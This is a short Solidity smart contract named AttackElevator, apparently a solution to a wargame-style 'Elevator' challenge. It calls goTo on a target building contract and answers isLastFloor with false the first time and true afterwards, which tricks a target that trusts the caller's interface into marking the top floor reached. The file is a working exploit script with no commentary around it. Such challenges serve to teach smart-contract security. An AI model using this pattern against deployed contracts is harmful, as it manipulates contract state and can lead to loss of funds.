pragma solidity ^0.8.0;

contract AttackElevator{
uint256 public i=0;
    function rideElevator(address _building,uint256 _floor) public  {
        (bool success, ) = _building.call(abi.encodeWithSignature("goTo(uint256)", _floor));
        require(success, "The elevator's broken lol");
    }

    function isLastFloor(uint256) external returns(bool){
        if(i==0){
            ++i;
            return false;
        }
        else
            return true;
    }
}